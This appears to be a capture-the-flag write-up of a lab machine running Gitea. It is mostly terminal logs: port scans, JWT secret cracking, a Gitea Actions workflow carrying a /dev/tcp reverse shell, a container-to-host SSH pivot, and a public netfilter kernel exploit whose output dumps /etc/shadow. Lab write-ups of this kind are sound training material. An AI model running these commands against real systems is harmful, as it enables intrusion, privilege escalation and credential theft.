@@ -1,1 +1,888 @@
 
+			ENUMERATION
+			
+
+---nmap---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.72 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 14:11 +03
+Nmap scan report for 10.0.2.72
+Host is up (0.00091s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=853433b3186de53a; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=egoIHf5LgDJ0c6VRl7anRUj9D3Q6MTcxNzA2NzUzODY4Mzk2Mzg2NQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Thu, 30 May 2024 11:12:18 GMT
+|     <!DOCTYPE html>
+|     <html lang="en-US" class="theme-auto">
+|     <head>
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <title>Gitea: Git with a cup of tea</title>
+|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovLzE5Mi4xNjguMS45OjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly8xOTIuMTY4LjEuOTozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXM
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=04b19d07737433b1; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=53qZLqmd6YF69E2JYBAPb9nkpio6MTcxNzA2NzU0MzgwNTcxMzkxMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Thu, 30 May 2024 11:12:23 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.94SVN%I=7%D=5/30%Time=66585F13%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+SF:d\x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
+SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
+SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
+SF:ea=853433b3186de53a;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
+SF:kie:\x20_csrf=egoIHf5LgDJ0c6VRl7anRUj9D3Q6MTcxNzA2NzUzODY4Mzk2Mzg2NQ;\x
+SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2030\x20May\x202024\x2011:12:18\x
+SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
+SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
+SF:ice-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x
+SF:20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:
+SF:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHR
+SF:lYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rhcn
+SF:RfdXJsIjoiaHR0cDovLzE5Mi4xNjguMS45OjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0d
+SF:HA6Ly8xOTIuMTY4LjEuOTozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1h
+SF:Z2UvcG5nIiwic2l6ZXM")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
+SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
+SF:\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Me
+SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x2
+SF:0GET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x2
+SF:0no-transform\r\nSet-Cookie:\x20i_like_gitea=04b19d07737433b1;\x20Path=
+SF:/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=53qZLqmd6YF69E2
+SF:JYBAPb9nkpio6MTcxNzA2NzU0MzgwNTcxMzkxMA;\x20Path=/;\x20Max-Age=86400;\x
+SF:20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\
+SF:x20Thu,\x2030\x20May\x202024\x2011:12:23\x20GMT\r\nContent-Length:\x200
+SF:\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
+SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
+SF:\n400\x20Bad\x20Request");
+MAC Address: 08:00:27:5D:DC:56 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.91 ms 10.0.2.72
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 130.64 seconds
+                                                    
+
+
+--- we discover the service ppp? is open ---
+
+
+
+--- let's run a gobuster scan on the 10.0.2.72:3000 ---
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.72:3000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.72:3000
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 303) [Size: 38] [--> /user/login]
+/issues               (Status: 303) [Size: 38] [--> /user/login]
+/dev                  (Status: 200) [Size: 18857]
+/v2                   (Status: 401) [Size: 50]
+/explore              (Status: 303) [Size: 41] [--> /explore/repos]
+/administrator        (Status: 200) [Size: 16490]
+/milestones           (Status: 303) [Size: 38] [--> /user/login]
+/notifications        (Status: 303) [Size: 38] [--> /user/login]
+/Dev                  (Status: 200) [Size: 18857]
+/DEV                  (Status: 200) [Size: 18855]
+/Administrator        (Status: 200) [Size: 16488]
+Progress: 882240 / 882244 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+--- I visit the http://10.0.2.72:3000/ and check the explore section, it leads to a git
+repository, I visit it ---
+
+
+--- I follow the instructions and download the repo to my machine ---
+
+
+
+                                                                                                      
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/41- RUN LINUX CTF]
+└─# git clone http://10.0.2.72:3000/dev/flask-jwt-auth.git 
+Cloning into 'flask-jwt-auth'...
+remote: Enumerating objects: 8, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 8 (delta 1), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (8/8), done.
+Resolving deltas: 100% (1/1), done.
+                                                                                                      
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/41- RUN LINUX CTF]
+└─# ls                               
+flask-jwt-auth  run_linux_os_ctf_writeup.txt
+                                                                                                      
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/41- RUN LINUX CTF]
+└─# cd flask-jwt-auth                              
+                                                                                                      
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/41- RUN LINUX CTF/flask-jwt-auth]
+└─# ls
+README.md  app.py  requirements.txt
+
+
+
+--- after that when I run the app I can't access the app for some reason, however to see
+the jwt (JSON Web Token) I can use ---
+
+  
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/41- RUN LINUX CTF/flask-jwt-auth]
+└─# git show                                              
+commit 82a427e2170354c619fb6e47345b684e39c4627c (HEAD -> main, origin/main, origin/HEAD)
+Author: dev <dev@run.hmv>
+Date:   Mon Feb 5 16:02:46 2024 +0000
+
+    initial commit
+
+diff --git a/app.py b/app.py
+index 127edca..36f1d68 100644
+--- a/app.py
++++ b/app.py
+@@ -7,14 +7,14 @@ from flask_jwt_extended import create_access_token, JWTManager, get_jwt_identity
+ 
+ app = Flask(__name__)
+ app.config['SECRET_KEY'] = "super_secret_key"
+-app.config['DEV_INSTANCE'] = True
++app.config['DEV_INSTANCE'] = False
+ app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///database.db"
+ 
+ db = SQLAlchemy(app)
+ api = Api(app)
+ jwt = JWTManager(app)
+ 
+-jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwNzE0ODY1OCwianRpIjoiNjAwMWI5N2YtZjllOC00YTIxLThlYWMtYmE5NWEwY2Y4MDQ4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldiIsIm5iZiI6MTcwNzE0ODY1OCwiY3NyZiI6ImFkZjdmOTBiLWQ2NDctNDljZS1hNGRhLTQ3NDI1OWZkYzcyYyIsImV4cCI6MTcwNzE0OTI1OCwidXNlcm5hbWUiOiJkZXYifQ.tRZPFKRfJV7T-EHyQiBFqDEE1hl83MyCGtaBpSMwU_o"
++jwt_token = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+ 
+ class User(db.Model):
+     id = db.Column(db.Integer, primary_key=True)
+                                                             
+
+
+
+--- I decode this jwt token via an online decoder ---
+
+
+Header
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+
+Payload
+{
+  "fresh": false,
+  "iat": 1707148658,
+  "jti": "6001b97f-f9e8-4a21-8eac-ba95a0cf8048",
+  "type": "access",
+  "sub": "dev",
+  "nbf": 1707148658,
+  "csrf": "adf7f90b-d647-49ce-a4da-474259fdc72c",
+  "exp": 1707149258,
+  "username": "dev"
+}
+
+
+
+
+--- we get a username, we can now try to crack this token in order to get a password
+from it ---
+
+
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/41- RUN LINUX CTF/flask-jwt-auth]
+└─# echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwNzE0ODY1OCwianRpIjoiNjAwMWI5N2YtZjllOC00YTIxLThlYWMtYmE5NWEwY2Y4MDQ4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldiIsIm5iZiI6MTcwNzE0ODY1OCwiY3NyZiI6ImFkZjdmOTBiLWQ2NDctNDljZS1hNGRhLTQ3NDI1OWZkYzcyYyIsImV4cCI6MTcwNzE0OTI1OCwidXNlcm5hbWUiOiJkZXYifQ.tRZPFKRfJV7T-EHyQiBFqDEE1hl83MyCGtaBpSMwU_o' > hash.txt
+                                                                                                      
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/41- RUN LINUX CTF/flask-jwt-auth]
+└─# john -w=/home/okina/wordlists/rockyou.txt hash.txt               
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+developer88      (?)     
+
+1g 0:00:00:05 DONE (2024-05-30 15:37) 0.1904g/s 1649Kp/s 1649Kc/s 1649KC/s devilbrave71630..dev60
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                       
+
+--- we got the password ---
+
+
+dev : developer88
+
+
+
+--- We got a login page when we ran the gobuster scan, let's get into the system using
+this credentials ---
+
+
+
+--- what we can do now is to create a reverse shell repository in the github account
+and the connect to it ---
+
+
+--- I create a repository named revshell and then I go to the settings to enable 
+repository actions settings also ---
+
+
+--- Then we come to our terminal and download this empty repo ---
+
+
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/41- RUN LINUX CTF]
+└─# git clone http://10.0.2.72:3000/dev/revshell.git      
+Cloning into 'revshell'...
+warning: You appear to have cloned an empty repository.
+                                                                                                      
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/41- RUN LINUX CTF]
+└─# ls
+flask-jwt-auth  revshell  run_linux_os_ctf_writeup.txt
+                                                                                                      
+┌──(root㉿kali)-[/home/…/Desktop/NOTLAR/HACKMYVM/41- RUN LINUX CTF]
+└─# cd revshell 
+                                                                                                      
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/41- RUN LINUX CTF/revshell]
+└─# ls
+                                                                                                       
+                                                                                                     
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/41- RUN LINUX CTF/revshell]
+└─# mkdir .gitea           
+                                                                                                      
+┌──(root㉿kali)-[/home/…/NOTLAR/HACKMYVM/41- RUN LINUX CTF/revshell]
+└─# cd .gitea  
+                                                                                                      
+┌──(root㉿kali)-[/home/…/HACKMYVM/41- RUN LINUX CTF/revshell/.gitea]
+└─# mkdir workflows
+                                                                                                      
+┌──(root㉿kali)-[/home/…/HACKMYVM/41- RUN LINUX CTF/revshell/.gitea]
+└─# cd workflows 
+                                                                                                      
+┌──(root㉿kali)-[/home/…/41- RUN LINUX CTF/revshell/.gitea/workflows]
+└─# nano shell.yaml   
+                      
+                                                                                
+┌──(root㉿kali)-[/home/…/41- RUN LINUX CTF/revshell/.gitea/workflows]
+└─# cat shell.yaml 
+name: Heimdallr
+run-name: ${{github.actor}} testing Gitea Action
+on: [push]
+jobs:
+  Explore-Gitea-Actions:
+    runs-on: run
+    steps:
+      - run: /bin/bash -i >& /dev/tcp/10.0.2.54/1234 0>&1
+                                                                 
+
+
+--- now we put our reverse shell in the yaml file, let's push this into the github repo ---
+
+
+ 
+                                                                                                     
+┌──(root㉿kali)-[/home/…/41- RUN LINUX CTF/revshell/.gitea/workflows]
+└─# git config user.email "dev@run.hmv"             
+                                                                                                      
+┌──(root㉿kali)-[/home/…/41- RUN LINUX CTF/revshell/.gitea/workflows]
+└─# git config user.name "dev"         
+                                                                                                      
+┌──(root㉿kali)-[/home/…/41- RUN LINUX CTF/revshell/.gitea/workflows]
+└─# git add .                 
+                                                                                                      
+┌──(root㉿kali)-[/home/…/41- RUN LINUX CTF/revshell/.gitea/workflows]
+└─# git commit -m "Testing"   
+[main (root-commit) d6a1a6f] Testing
+ 1 file changed, 8 insertions(+)
+ create mode 100644 .gitea/workflows/shell.yaml
+                                                                                                      
+┌──(root㉿kali)-[/home/…/41- RUN LINUX CTF/revshell/.gitea/workflows]
+└─# git push origin main   
+Username for 'http://10.0.2.72:3000': dev
+Password for 'http://dev@10.0.2.72:3000': 
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 2 threads
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (5/5), 439 bytes | 439.00 KiB/s, done.
+Total 5 (delta 0), reused 0 (delta 0), pack-reused 0
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://10.0.2.72:3000/dev/revshell.git
+ * [new branch]      main -> main
+                                             
+
+
+--- now open up your listener, then go to the repository's .gitea/workflows directory. Go to the 
+"actions" tab and run the job ---
+
+
+
+
+
+			GAINING FOOTHOLD
+		
+                                                                                                      
+┌──(root㉿kali)-[/home/okina]
+└─# nc -lvnp 1234           
+listening on [any] 1234 ...
+connect to [10.0.2.54] from (UNKNOWN) [10.0.2.72] 60252
+act@b3f3a49d18ba:~/cache/actions/2223e0d88e9f482f/hostexecutor$ 
+
+
+
+--- we are in, I keep on searching and looking around ---
+
+			
+act@b3f3a49d18ba:/home$ sudo su -
+sudo su -
+
+sudo -l
+Matching Defaults entries for root on b3f3a49d18ba:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User root may run the following commands on b3f3a49d18ba:
+    (ALL : ALL) ALL
+
+whoami
+root
+
+
+
+--- we become the root user but we are still in the docker container, we should look for ways to
+improve our stations ---
+
+
+python3 -c "import pty;pty.spawn('/bin/bash')";
+root@b3f3a49d18ba:~# cd /root
+cd /root
+
+root@b3f3a49d18ba:~# ls
+ls
+
+
+
+--- to display the routing table of the system we can run the following command ---
+
+root@b3f3a49d18ba:~# ip route show
+ip route show
+default via 172.18.0.1 dev eth0 
+172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.4 
+
+
+
+
+--- here we discover the default address is 172.18.0.1 and it's interface ---
+
+
+
+--- now that we learned the default address of the system we can perform enumeration on it. 
+To do so we can upload nmap into the victim system to discover any open ports and services ---
+
+
+
+root@b3f3a49d18ba:~# apt-get install nmap
+apt-get install nmap
+.
+.
+.
+.
+
+
+root@b3f3a49d18ba:~# nmap 172.18.0.1 -sS -sV -A -T4
+
+nmap 172.18.0.1 -sS -sV -A -T4
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-30 13:17 UTC
+Nmap scan report for run (172.18.0.1)
+Host is up (0.000055s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f3c02bc34f39a5548b398d705028b0a6 (ECDSA)
+|_  256 26c6f5e5a5f2fc1c4aa95a3c67637e22 (ED25519)
+3000/tcp open  ppp?
+.
+.
+.
+.
+
+
+--- ssh port is open baby, let's roll ---
+
+			
+
+root@b3f3a49d18ba:~# ssh dev@172.18.0.1
+
+ssh dev@172.18.0.1
+The authenticity of host '172.18.0.1 (172.18.0.1)' can't be established.
+ED25519 key fingerprint is SHA256:IGhXsYmgq4sTpoMPHq+MgSiAiNHWOR4ZkocqlvZPGis.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Warning: Permanently added '172.18.0.1' (ED25519) to the list of known hosts.
+dev@172.18.0.1's password: developer88
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Tue Feb  6 15:52:41 2024 from 172.18.0.4
+
+dev@run:~$ ls
+ls
+user.txt
+
+dev@run:~$ cat user.txt	
+cat user.txt
+56f98bdfaf5186243bc4cb99f0674f58
+
+---First User Flag---
+
+
+
+--- check for SUID bits, cron jobs, writable/executable files but can't find much ---
+
+
+--- I utilize "uname -a" to check all the available system information such as kernel name,
+network node hostname, kernel release, kernel version etc. And then run "uname -r" to check
+only the kernel release, this is used to know the exact version of the kernel running on the
+system ---
+
+
+dev@run:~$ uname -a
+uname -a
+Linux run 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+dev@run:~$ uname -r
+uname -r
+6.2.0-20-generic
+
+
+
+--- now I search for exploits regarding the 6.2.0-20-generic kernel version and find a 
+github repo ---
+
+
+https://github.com/Liuk3r/CVE-2023-32233
+
+
+
+--- In order to utilize this exploit we first download it to our machine, do the neccessary 
+adjustments and then upload the exploit file to the target system ---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# cd /opt       
+                                                                                                      
+┌──(root㉿kali)-[/opt]
+└─# git clone https://github.com/Liuk3r/CVE-2023-32233.git
+Cloning into 'CVE-2023-32233'...
+remote: Enumerating objects: 22, done.
+remote: Counting objects: 100% (22/22), done.
+remote: Compressing objects: 100% (19/19), done.
+remote: Total 22 (delta 3), reused 14 (delta 1), pack-reused 0
+Receiving objects: 100% (22/22), 19.69 KiB | 395.00 KiB/s, done.
+Resolving deltas: 100% (3/3), done.
+                                                                                                      
+┌──(root㉿kali)-[/opt]
+└─# cd CVE-2023-32233/
+                                                                                                      
+┌──(root㉿kali)-[/opt/CVE-2023-32233]
+└─# ls
+ORIGIN.md  README.md  exploit.c
+
+
+--- check the README.md and we see that we need to install dependencies and then compile the 
+exploit ---
+
+
+                                                                                                      
+┌──(root㉿kali)-[/opt/CVE-2023-32233]
+└─# sudo apt install gcc libmnl-dev libnftnl-dev
+.
+.
+.
+
+
+┌──(root㉿kali)-[/opt/CVE-2023-32233]
+└─# gcc -Wall -o exploit exploit.c -lmnl -lnftnl
+
+                                                                                                      
+┌──(root㉿kali)-[/opt/CVE-2023-32233]
+└─# ls
+ORIGIN.md  README.md  exploit  exploit.c
+            
+
+┌──(root㉿kali)-[/opt/CVE-2023-32233]
+└─# file exploit 
+exploit: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0abf0151e3b64a7c8996dfd1342faeaf44cad5b9, for GNU/Linux 3.2.0, not stripped
+               
+
+
+--- now we have the exploit ready to go ---
+            
+
+
+
+
+			
+			PRIVILEGE ESCALATION
+
+
+--- transfer the exploit ---
+
+┌──(root㉿kali)-[/opt/CVE-2023-32233]
+└─# python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.0.2.72 - - [30/May/2024 16:41:23] "GET /exploit HTTP/1.1" 200 -
+
+
+dev@run:~$ wget http://10.0.2.54:8080/exploit
+wget http://10.0.2.54:8080/exploit
+--2024-05-30 13:41:22--  http://10.0.2.54:8080/exploit
+Connecting to 10.0.2.54:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 63456 (62K) [application/octet-stream]
+Saving to: ‘exploit’
+
+exploit             100%[===================>]  61.97K  --.-KB/s    in 0.001s  
+
+2024-05-30 13:41:22 (62.3 MB/s) - ‘exploit’ saved [63456/63456]
+
+
+dev@run:~$ ./exploit
+./exploit
+
+-bash: ./exploit: Permission denied
+
+
+--- give it permission ---
+
+
+dev@run:~$ chmod +x exploit
+chmod +x exploit
+
+
+dev@run:~$ ./exploit
+./exploit
+[*] Netfilter UAF exploit
+
+
+Using profile:
+========
+1                   race_set_slab                   # {0,1}
+1572                race_set_elem_count             # k
+4000                initial_sleep                   # ms
+100                 race_lead_sleep                 # ms
+600                 race_lag_sleep                  # ms
+100                 reuse_sleep                     # ms
+39d240              free_percpu                     # hex
+2a8b900             modprobe_path                   # hex
+23700               nft_counter_destroy             # hex
+347a0               nft_counter_ops                 # hex
+a                   nft_counter_destroy_call_offset # hex
+ffffffff            nft_counter_destroy_call_mask   # hex
+e8e58948            nft_counter_destroy_call_check  # hex
+========
+
+[*] Checking for available CPUs...
+[*] sched_getaffinity() => 0 2
+[*] Reserved CPU 0 for PWN Worker
+[*] Creating "/tmp/modprobe"...
+[*] Creating "/tmp/trigger"...
+[*] Updating setgroups...
+[*] Updating uid_map...
+[*] Updating gid_map...
+[*] Signaling PWN Worker...
+[*] Waiting for PWN Worker...
+[*] Starting PWN Worker
+[*] Putting on seatbelts
+pwn_prepare
+whoami
+whoami
+pwn_uaf_spray
+pwn_delay_spray_set
+pwn_uaf_trigger
+pwn_uaf_race
+pwn_uaf_new_obj
+pwn_uaf_dump_rule
+
+Detected UAF with uaf_obj_serial=c reusing uaf_log_handle=bb:
+0000:  75 61 66 5f 6f 62 6a 5f 30 30 30 63 5f 43 43 43  |  uaf_obj_000c_CCC
+0010:  43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  |  CCCCCCCCCCCCCCCC
+0020:  43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  |  CCCCCCCCCCCCCCCC
+0030:  43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  |  CCCCCCCCCCCCCCCC
+0040:  43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  |  CCCCCCCCCCCCCCCC
+0050:  43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  |  CCCCCCCCCCCCCCCC
+0060:  43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  |  CCCCCCCCCCCCCCCC
+0070:  43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  |  CCCCCCCCCCCCCCCC
+0080:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
+0090:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
+00a0:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
+00b0:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
+00c0:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
+00d0:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
+00e0:  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  |  AAAAAAAAAAAAAAAA
+00f0:  41 41 41 41 41 41 41 41 41 41 41 41 41 41        |  AAAAAAAAAAAAAA
+pwn_uaf_del_rule
+pwn_uaf_dump_obj uaf_obj_000c_
+
+0000:  79 5a f7 f7 db 95 ff ff 00 0c 00 00 00 00 00 00  |  yZ..............
+0010:  40 00 00 00 1c 00 00 00 00 00 00 00 00 00 00 00  |  @...............
+0020:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |  ................
+0030:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |  ................
+0040:  00 00 00 00 00 00 00 00 30 00 00 00 00 00 00 00  |  ........0.......
+0050:  a0 c7 bc c0 ff ff ff ff 88 57 01 02 fe 3b 00 00  |  .........W...;..
+0060:  e0 80 c8 c0 ff ff ff ff 00 00 00 00 00 00 00 00  |  ................
+0070:  00 00 00 00 00 00 00 00 30 6e 1b 84 db 95 ff ff  |  ........0n......
+
+nf_tables_va=ffffffffc0b98000
+
+pwn_uaf_del_obj uaf_obj_%04hx_ c
+pwn_read_new_obj ffffffffc0bbb70a
+pwn_read_dump_set_elem
+
+read expr:
+0000:  72 65 61 64 5f 6f 62 6a 5f 30 30 30 33 5f 00 00  |  read_obj_0003_..
+0010:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |  ................
+0020:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |  ................
+0030:  00 00 00 00                                      |  ....
+bytes 18446744073709551615 consumed 17446411894769682760 flags 0 
+
+read_data=f21e1b2ee8e58948
+
+kernel_va=ffffffffb2a00000
+
+pwn_uaf_del_obj read_obj_%04hx_ 3
+pwn_write_new_obj ffffffffb548b901
+[*] Signaling status=0 to coordinator...
+[*] Got status=0 from PWN Worker...
+[*] Checking "cat /proc/sys/kernel/modprobe"...
+//tmp/modprobe
+/tmp/trigger: 1:     : not found
+[*] Checking "/etc/shadow"...
+root:$y$j9T$xfElC0tV5a0mSPb1tZ5kq/$2xaoiScyTxIhuB/4AyqQJmtJPIg05GyrM0.xAvTyiPA:19759:0:99999:7:::
+daemon:*:19462:0:99999:7:::
+bin:*:19462:0:99999:7:::
+sys:*:19462:0:99999:7:::
+sync:*:19462:0:99999:7:::
+games:*:19462:0:99999:7:::
+man:*:19462:0:99999:7:::
+lp:*:19462:0:99999:7:::
+mail:*:19462:0:99999:7:::
+news:*:19462:0:99999:7:::
+uucp:*:19462:0:99999:7:::
+proxy:*:19462:0:99999:7:::
+www-data:*:19462:0:99999:7:::
+backup:*:19462:0:99999:7:::
+list:*:19462:0:99999:7:::
+irc:*:19462:0:99999:7:::
+_apt:*:19462:0:99999:7:::
+nobody:*:19462:0:99999:7:::
+systemd-network:!*:19462::::::
+systemd-timesync:!*:19462::::::
+messagebus:!:19462::::::
+systemd-resolve:!*:19462::::::
+pollinate:!:19462::::::
+syslog:!:19462::::::
+uuidd:!:19462::::::
+tcpdump:!:19462::::::
+tss:!:19462::::::
+landscape:!:19462::::::
+fwupd-refresh:!:19462::::::
+dev:$y$j9T$/vO4x4YorAt9NZFdGFXlW/$3jEHxOuay6gjxpLjnU4qteiI6MlgZ6W/dO1Zzc3VLu/:19759:0:99999:7:::
+lxd:!:19758::::::
+dnsmasq:!:19758::::::
+sshd:!:19759::::::
+
